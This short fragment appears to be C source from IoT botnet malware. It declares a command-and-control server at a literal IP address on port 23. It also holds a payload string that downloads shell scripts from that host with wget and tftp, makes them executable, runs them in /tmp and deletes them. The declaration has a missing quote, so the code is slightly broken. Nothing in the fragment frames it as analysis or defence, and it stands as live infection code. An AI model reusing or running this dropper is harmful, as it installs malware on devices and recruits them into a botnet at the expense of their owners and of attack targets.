...
unsigned char *commServer[] = { 45.76.29.203:23" };

char *payload = "cd /tmp; wget http://45.76.29.203/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.76.29.203 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh";
